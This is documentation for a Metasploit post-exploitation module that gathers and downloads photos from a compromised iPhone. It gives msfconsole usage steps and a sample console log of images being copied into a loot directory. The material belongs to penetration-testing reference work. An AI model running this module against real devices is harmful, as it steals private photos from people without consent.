## Description

  This module downloads the discovered images on iPhones

## Verification Steps

  1. Start msfconsole
  2. Get a session
  3. Do: ```use post/apple_ios/gather/ios_image_gather```
  4. Do: ```set SESSION <session>```
  5. Do: ```run```
  6. You should get images from the iPhone target.

## Scenarios

### Tested on iOS 10.3.3 on an iPhone 5

  ```

  msf5 > use post/apple_ios/gather/ios_image_gather 
  msf5 post(apple_ios/gather/ios_image_gather) > set session 1
  session => 1
  msf5 post(apple_ios/gather/ios_image_gather) > run

  [!] SESSION may not be compatible with this module.
  [+] Image path found. Will begin searching for images...
  [*] Directory for iOS images: /Users/space/.msf4/loot/KlaBVw
  [*] Downloading image: IMG_0001.JPG
  [*] Downloading image: IMG_0002.JPG
  [*] Downloading image: IMG_0003.JPG
  [*] Downloading image: shell.php.jpg
  [*] Post module execution completed


  ```
